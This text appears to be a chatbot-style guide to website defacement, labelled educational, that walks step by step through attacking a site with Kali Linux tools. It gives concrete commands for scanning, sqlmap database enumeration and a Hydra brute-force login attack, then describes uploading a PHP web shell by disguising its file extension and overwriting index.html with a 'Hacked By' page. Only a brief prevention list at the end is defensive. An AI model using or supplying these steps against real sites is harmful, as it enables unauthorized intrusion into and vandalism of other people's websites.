🔍 What Is a Defacement Attack?
A defacement attack typically involves:

Gaining unauthorized access to a web server

Replacing the index page (usually index.html, index.php)

Leaving behind a hacker's message or image ("deface page")

🧰 Kali Linux Tools & Techniques for Defacement (Educational Purposes)
⚙️ Step 1: Reconnaissance
Tools Used:

Nmap – Scan open ports

WhatWeb, Wappalyzer – Detect CMS (WordPress, Joomla, etc.)

theHarvester – Collect emails/domains for phishing prep

bash
Copy
Edit
nmap -sV target.com
whatweb target.com
🛠️ Step 2: Vulnerability Scanning
Tools Used:

Nikto – Scan for known web vulnerabilities

WPScan – Scan WordPress vulnerabilities

Dirb, Gobuster – Discover hidden admin panels

bash
Copy
Edit
nikto -h http://target.com
wpscan --url http://target.com --enumerate u
🚪 Step 3: Gaining Access
Methods:

SQL Injection (if database is vulnerable)

Remote File Upload vulnerability

Exploiting outdated CMS/plugins

Bruteforcing login portals (admin panel)

Tools Used:

sqlmap

Burp Suite

Hydra

bash
Copy
Edit
sqlmap -u "http://target.com/index.php?id=1" --dbs
hydra -l admin -P rockyou.txt target.com http-post-form "/admin:username=^USER^&password=^PASS^:F=incorrect"
🧬 Step 4: Web Shell Upload
Once a file upload vulnerability is found, upload a PHP web shell (like c99, b374k, or r57).

Steps:

Rename shell to shell.php.jpg or use MIME spoofing

Upload via vulnerable file form

Access it: http://target.com/uploads/shell.php

🧾 Step 5: Defacement
Navigate through the shell, find the root directory (like /var/www/html), and replace:

bash
Copy
Edit
mv index.html index_backup.html
echo "<h1>Hacked By XYZ</h1>" > index.html
Or use the web shell’s file manager.

🛡️ How to Prevent Defacement (For Admins)
Keep all software (CMS, plugins) updated

Use strong admin passwords & 2FA

Disable file uploads or validate them

Monitor logs (e.g., /var/log/apache2/access.log)

Use WAFs (Web Application Firewalls)
